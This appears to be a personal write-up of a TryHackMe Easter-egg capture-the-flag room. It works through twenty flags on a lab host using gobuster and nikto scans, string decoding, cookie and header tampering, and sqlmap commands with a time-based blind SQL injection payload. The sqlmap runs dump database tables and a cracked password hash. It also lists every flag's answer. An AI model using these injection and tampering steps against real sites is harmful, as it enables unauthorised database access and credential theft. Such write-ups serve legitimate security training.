
http://10.10.139.135/robots.txt
```
User-agent: * (I don't think this is entirely true, DesKel just wanna to play himself)
Disallow: /VlNCcElFSWdTQ0JKSUVZZ1dTQm5JR1VnYVNCQ0lGUWdTU0JFSUVrZ1p5QldJR2tnUWlCNklFa2dSaUJuSUdjZ1RTQjVJRUlnVHlCSklFY2dkeUJuSUZjZ1V5QkJJSG9nU1NCRklHOGdaeUJpSUVNZ1FpQnJJRWtnUlNCWklHY2dUeUJUSUVJZ2NDQkpJRVlnYXlCbklGY2dReUJDSUU4Z1NTQkhJSGNnUFElM0QlM0Q=


45 61 73 74 65 72 20 31 3a 20 54 48 4d 7b 34 75 37 30 62 30 37 5f 72 30 6c 6c 5f 30 75 37 7d

```


# gobuster /
```
root@kali:~# gobuster dir -u http://10.10.139.135/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.139.135/
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/05/12 11:16:26 Starting gobuster
===============================================================
/login (Status: 301) :login page show up 
/button (Status: 200) :buttn
/index (Status: 200)
/static (Status: 200) image
/cat (Status: 200) cat image
/small (Status: 200)  flag19!
/who (Status: 200) image
/robots (Status: 200)
/iphone (Status: 200) image
/game1 (Status: 301)  page
/egg (Status: 200) image
/dinner (Status: 200) 
/ty (Status: 200) image
/ready (Status: 301)
/saw (Status: 200)
/game2 (Status: 301) page
/wel (Status: 200)
/free_sub (Status: 301) ??
/nicole (Status: 200) 
/server-status (Status: 403)
===============================================================
2020/05/12 11:17:02 Finished
===============================================================
root@kali:~#
```

# nikto /
```
root@kali:~# nikto -h http://10.10.139.135
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.10.139.135
+ Target Hostname:    10.10.139.135
+ Target Port:        80
+ Start Time:         2020-05-12 11:16:51 (GMT0)
---------------------------------------------------------------------------
+ Server: Apache/2.2.22 (Ubuntu)
+ Cookie Invited created without the httponly flag
+ Retrieved x-powered-by header: PHP/5.3.10-1ubuntu3.26
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ Uncommon header 'busted' found, with contents: Hey, you found me, take this Easter 6: THM{l37'5_p4r7y_h4rd}
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ Server may leak inodes via ETags, header found with file /robots.txt, inode: 918959, size: 430, mtime: Mon Jan  6 07:41:24 2020
+ "robots.txt" contains 1 entry which should be manually viewed.
+ Uncommon header 'tcn' found, with contents: list
+ Apache mod_negotiation is enabled with MultiViews, which allows attackers to easily brute force file names. See http://www.wisec.it/sectou.php?id=4698ebdc59d15. The following alternatives for 'index' were found: index.php
+ Apache/2.2.22 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ Web Server returns a valid response with junk HTTP methods, this may cause false positives.
+ OSVDB-12184: /?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
+ OSVDB-12184: /?=PHPE9568F36-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
+ OSVDB-12184: /?=PHPE9568F34-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
+ OSVDB-12184: /?=PHPE9568F35-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
+ OSVDB-3092: /login/: This might be interesting...
+ OSVDB-3233: /icons/README: Apache default file found.
+ 8700 requests: 0 error(s) and 18 item(s) reported on remote host
+ End Time:           2020-05-12 11:17:08 (GMT0) (17 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
root@kali:~#
```


# flag1
```

45 61 73 74 65 72 20 31 3a 20 54 48 4d 7b 34 75 37 30 62 30 37 5f 72 30 6c 6c 5f 30 75 37 7d
ascii
Easter 1: THM{4u70b07_r0ll_0u7}
```


# flag2
```
/VlNCcElFSWdTQ0JKSUVZZ1dTQm5JR1VnYVNCQ0lGUWdTU0JFSUVrZ1p5QldJR2tnUWlCNklFa2dSaUJuSUdjZ1RTQjVJRUlnVHlCSklFY2dkeUJuSUZjZ1V5QkJJSG9nU1NCRklHOGdaeUJpSUVNZ1FpQnJJRWtnUlNCWklHY2dUeUJUSUVJZ2NDQkpJRVlnYXlCbklGY2dReUJDSUU4Z1NTQkhJSGNnUFElM0QlM0Q=

base 64

DesKel_secret_base
view-source:http://10.10.139.135/DesKel_secret_base/
<html>
	<head>
		<title> A slow clap for you</title>
		<h1 style="text-align:center;">A slow clap for you</h1>
	</head>
	
	<body>
	<p style="text-align:center;"><img src="kim.png"/></p>
	<p style="text-align:center;">Not bad, not bad.... papa give you a clap</p>
	<p style="text-align:center;color:white;">Easter 2: THM{f4ll3n_b453}</p>
	</body>

</html>

```

# flag3
```

POST /login/ HTTP/1.1
Host: 10.10.139.135
User-Agent: Mozilla/5.0 (X11; CrOS armv7l 9592.96.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.114 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: ja,en-US;q=0.7,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 47
Origin: http://10.10.139.135
Connection: close
Referer: http://10.10.139.135/login/
Cookie: Invited=0
Upgrade-Insecure-Requests: 1

username=DesKel&password=heIsDumb&submit=submit

----

HTTP/1.1 200 OK
Date: Tue, 12 May 2020 11:33:17 GMT
Server: Apache/2.2.22 (Ubuntu)
X-Powered-By: PHP/5.3.10-1ubuntu3.26
Vary: Accept-Encoding
Content-Length: 798
Connection: close
Content-Type: text/html

<!DOCTYPE html PUBLIC"-//W3C//DTD XHTML 1.0 Strict//EN"
"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd"
<html>

	<head>
		<meta content="text/html;charset=utf-8" http-equiv="Content-Type">
		<meta content="utf-8" http-equiv="encoding">
		<p hidden>Seriously! You think the php script inside the source code? Pfff.. take this easter 3: THM{y0u_c4n'7_533_m3}</p> 
		<title>Can you find the egg?</title>
		<h1>Just an ordinary login form!</h1>
	</head>
	
	<body>
		
		<p>You don't need to register yourself</p><br><br>
		<form method='POST'>
			Username:<br>
			<input type="text" name="username" required>
			<br><br>
			Password:<br>
			<input type="text" name="password" required>
			<br><br>
			<button name="submit" value="submit">Login</button>
		</form>

		

wrong password	</body>
</html>

```
# flag 4

```

login 
sqlmap -u "http://10.10.139.135/login/" --data "username=KesKel&password=heIsDumb&submit=submit"
sqlmap identified the following injection point(s) with a total of 235 HTTP(s) requests:
---
Parameter: username (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=KesKel' AND (SELECT 9317 FROM (SELECT(SLEEP(5)))rBSi) AND 'Rbvn'='Rbvn&password=heIsDumb&submit=submit
---
[12:31:07] [INFO] the back-end DBMS is MySQL
[12:31:07] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions
web server operating system: Linux Ubuntu 13.04 or 12.04 or 12.10 (Raring Ringtail or Precise Pangolin or Quantal Quetzal)
web application technology: Apache 2.2.22, PHP 5.3.10
back-end DBMS: MySQL >= 5.0.12
[12:31:07] [INFO] fetched data logged to text files under '/root/.sqlmap/output/10.10.139.135'

sqlmap -u "http://10.10.139.135/login/" --data "username=KesKel&password=heIsDumb&submit=submit" --dbs

available databases [4]:
[*] information_schema
[*] mysql
[*] performance_schema
[*] THM_f0und_m3


sqlmap -u "http://10.10.139.135/login/" --data "username=KesKel&password=heIsDumb&submit=submit" --dbms MySQL -D THM_f0und_m3 -T nothing_inside --dump
+----------------+
| user           |
| nothing_inside |
+----------------+

sqlmap -u "http://10.10.139.135/login/" --data "username=KesKel&password=heIsDumb&submit=submit" --dbms MySQL -D THM_f0und_m3 -T nothing_inside --dump

sqlmap -u "http://10.10.139.135/login/" --data "username=KesKel&password=heIsDumb&submit=submit" --dbms MySQL -D THM_f0und_m3 -T user --dump

+-------------------------+
| Easter_4                |
+-------------------------+
| THM{1nj3c7_l1k3_4_b055} |
+-------------------------+
```
# flag5
```
sqlmap -u "http://10.10.139.135/login/" --data "username=KesKel&password=heIsDumb&submit=submit" --dbms MySQL -D THM_f0und_m3 -T user --dump

+------------------------------------------+----------+
| password                                 | username |
+------------------------------------------+----------+
| 05f3672ba34409136aa71b8d00070d1b (cutie) | DesKel   |
| He is a nice guy, say hello for me       | Skidy    |
+------------------------------------------+----------+

POST /login/ HTTP/1.1
Host: 10.10.139.135
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 13_1_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.1 Mobile/15E148 Safari/604.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: ja,en-US;q=0.7,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 44
Origin: http://10.10.139.135
Connection: close
Referer: http://10.10.139.135/login/
Cookie: Invited=1
Upgrade-Insecure-Requests: 1
egg: yes

username=DesKel&password=cutie&submit=submit

Easter 5: THM{wh47_d1d_17_c057_70_cr4ck_7h3_5ql} 


```


# flag6
```
GET / HTTP/1.1
Host: 10.10.139.135
User-Agent: Mozilla/5.0 (X11; CrOS armv7l 9592.96.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.114 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: ja,en-US;q=0.7,en;q=0.3
Accept-Encoding: gzip, deflate
Connection: close
Cookie: Invited=0
Upgrade-Insecure-Requests: 1

---
HTTP/1.1 200 OK
Date: Tue, 12 May 2020 11:08:51 GMT
Server: Apache/2.2.22 (Ubuntu)
X-Powered-By: PHP/5.3.10-1ubuntu3.26
Busted: Hey, you found me, take this Easter 6: THM{l37'5_p4r7y_h4rd}
Vary: Accept-Encoding
Connection: close
Content-Type: text/html
Content-Length: 94328

<!DOCTYPE html>
<html>

```

# flag7
```
change cookie

invited=1
<h2> You are now officially invited. Enjoy the easter 7: THM{w3lc0m3!_4nd_w3lc0m3} </h2>
			<hr><hr><hr><hr><hr><

```

# flag8
```
change useragent
Mozilla/5.0 (iPhone; CPU iPhone OS 13_1_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.1 Mobile/15E148 Safari/604.1
```

# flag9
```
GET /ready/ HTTP/1.1
Host: 10.10.139.135
User-Agent: Mozilla/5.0 (X11; CrOS armv7l 9592.96.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.114 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: ja,en-US;q=0.7,en;q=0.3
Accept-Encoding: gzip, deflate
Referer: http://10.10.139.135/
Connection: close
Cookie: Invited=0
Upgrade-Insecure-Requests: 1

----
HTTP/1.1 200 OK
Date: Tue, 12 May 2020 11:40:33 GMT
Server: Apache/2.2.22 (Ubuntu)
X-Powered-By: PHP/5.3.10-1ubuntu3.26
Vary: Accept-Encoding
Content-Length: 276
Connection: close
Content-Type: text/html

<html>
	<head>
		<title>You just press it</title>
		<meta http-equiv="refresh" content="3;url=http:gone.php" />
		<p style="text-align:center"><img src="bye.gif"/></p>
		<!-- Too fast, too good, you can't catch me. I'm sanic Easter 9: THM{60nn4_60_f457} -->
	</head>

</html>



```


# flag10
```
GET /free_sub/ HTTP/1.1
Host: 10.10.139.135
User-Agent: Mozilla/5.0 (X11; CrOS armv7l 9592.96.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.114 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: ja,en-US;q=0.7,en;q=0.3
Accept-Encoding: gzip, deflate
Connection: close
Cookie: Invited=0
Upgrade-Insecure-Requests: 1



HTTP/1.1 200 OK
Date: Tue, 12 May 2020 12:09:30 GMT
Server: Apache/2.2.22 (Ubuntu)
X-Powered-By: PHP/5.3.10-1ubuntu3.26
Vary: Accept-Encoding
Content-Length: 65
Connection: close
Content-Type: text/html

only people came from tryhackme are allowed to claim the voucher.

GET /free_sub/ HTTP/1.1
Referer:tryhackme.com
Host: 10.10.139.135
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 13_1_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.1 Mobile/15E148 Safari/604.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: ja,en-US;q=0.7,en;q=0.3
Accept-Encoding: gzip, deflate
Connection: close
Cookie: Invited=1
Upgrade-Insecure-Requests: 1



HTTP/1.1 200 OK
Date: Tue, 12 May 2020 12:55:38 GMT
Server: Apache/2.2.22 (Ubuntu)
X-Powered-By: PHP/5.3.10-1ubuntu3.26
Vary: Accept-Encoding
Content-Length: 118
Connection: close
Content-Type: text/html

Nah, there are no voucher here, I'm too poor to buy a new one XD. But i got an egg for you. Easter 10: THM{50rry_dud3}

```



# flag11

```

Mmmmmm... what a healthy choice, I prefer an egg 


POST / HTTP/1.1
Host: 10.10.139.135
User-Agent: Mozilla/5.0 (X11; CrOS armv7l 9592.96.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.114 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: ja,en-US;q=0.7,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 24
Origin: http://10.10.139.135
Connection: close
Referer: http://10.10.139.135/
Cookie: Invited=0
Upgrade-Insecure-Requests: 1

dinner=egg&submit=submit

You found the secret menu, take the easter 11: THM{366y_b4k3y}	<h1 style="color:red"">Press this button if you wishes to watch the world burn!!!!!!!!!!!!!!!!<h1>
```

# flag12
```
	str1 = '4561737465722031322069732054484d7b68316464336e5f6a355f66316c337d'
	var hex  = str1.toString();
	var str = '';
	for (var n = 0; n < hex.length; n += 2) {
		str += String.fromCharCode(parseInt(hex.substr(n, 2), 16));
	}
console.log(str)

Easter 12 is THM{h1dd3n_j5_f1l3}
```


# flag13
```
push botan icon click

http://10.10.139.135/ready/gone.php

HTTP/1.1 200 OK
Date: Tue, 12 May 2020 11:40:39 GMT
Server: Apache/2.2.22 (Ubuntu)
X-Powered-By: PHP/5.3.10-1ubuntu3.26
Vary: Accept-Encoding
Content-Length: 283
Connection: close
Content-Type: text/html

<html>
		<title>Congratulation</title>
		<h1 style="text-align:center">Congratulation!You just ended the world</h1>
		<p style="text-align:center"><img src="bomb.gif"></p><br><br>
		<p style="text-align:center">Happy? Take the egg now. Easter 13: THM{1_c4n'7_b3l13v3_17}</p>
</html>


```


# flag 14
```
GET / HTTP/1.1


	<h2>Did you know: During your lifetime, you will produce enough saliva to fill two swimming pools.</h2>
	<!--Easter 14<img xxxxxxxxxxx-->

comment out 
picuture show up 

```


# flag15
```
http://10.10.139.135/game1/
hint:51 89 77 93 126 14 93 10 
input
a  b  c  d  e  f  g  h  i  j  k  l  m  n  o  p  q  r  s  t  u  v  w  x  y  z
89 90 91 92 93 94 95 41 42 43 75 76 77 78 79 80 81 10 11 12 13 14 15 16 17 18

output capital
 A  B   C   D   E   F   G  H  I  J  K  L  M  N  O   P   Q   R   S   T   U   V    W  X   W   Z 
 99 100 101 102 103 104 51 52 53 54 55 56 57 58 126 127 128 129 130 131 136 137 138 139 140 141
 
hint:51 89 77 93 126 14 93 10 
     G   a m  e  O   v  e  r
     
     
Good job on completing the puzzle, Easter 15: THM{ju57_4_64m3} 
```

# flag16
```
game2

Try Harder, I need all 3 buttons get pressed at once 

POST /game2/ HTTP/1.1
Host: 10.10.139.135
User-Agent: Mozilla/5.0 (X11; CrOS armv7l 9592.96.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.114 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: ja,en-US;q=0.7,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 61
Origin: http://10.10.139.135
Connection: close
Referer: http://10.10.139.135/game2/
Cookie: Invited=0
Upgrade-Insecure-Requests: 1

button1=button1&button2=button2&button3=button3&submit=submit


Just temper the code and you are good to go. Easter 16: THM{73mp3r_7h3_h7ml} 
```
# flag17
```
	
	<script>
	function catz(){
        	document.getElementById("nyan").innerHTML = "100010101100001011100110111010001100101011100100010000000110001001101110011101000100000010101000100100001001101011110110110101000110101010111110110101000110101010111110110101100110011011100000101111101100100001100110110001100110000011001000011001101111101"
	}
	</script>

100010101100001011100110111010001100101011100100010000000110001001101110011101000100000010101000100100001001101011110110110101000110101010111110110101000110101010111110110101100110011011100000101111101100100001100110110001100110000011001000011001101111101
hex
4561737465722031373A2054484D7B6A355F6A355F6B33705F6433633064337D
45 61 73 74 65 72 20 31 37 3A 20 54 48 4D 7B 6A 35 5F 6A 35 5F 6B 33 70 5F 64 33 63 30 64 33 7D

ascii
Easter 17: THM{j5_j5_k3p_d3c0d3}

```

# flag18
```
addheader
egg:Yes


```

# flag 19
```
http://10.10.139.135/small

picture show up

```

# flag 20
```
<h3> Hey! I got the easter 20 for you. I leave the credential for you to POST (username:DesKel, password:heIsDumb). Please, I beg you. Don't let him know.</h3>


curl -XPOST http://10.10.139.135 -d"username=DesKel&password=heIsDumb"


        <h2>Sometime, you just need to say 'YES' to the 'egg'. The page will definately roll the egg for you</h2>
                <img src="egg.gif"/><img src="egg.gif"/><img src="egg.gif"/><img src="egg.gif"/><img src="egg.gif"/>
        <h1>DID YOU KNOW: All swans in England belong to the queen. </h1>
        <img height="2" width="2000" src="small.png"/>
        <h3> Hey! I got the easter 20 for you. I leave the credential for you to POST (username:DesKel, password:heIsDumb). Please, I beg you. Don't let him know.</h3>
        Okay, you pass, Easter 20: THM{17_w45_m3_4ll_4l0n6}     <br><br><br>
        <h2 style="text-align:center;"> That's all! Thank you!</h2>
```

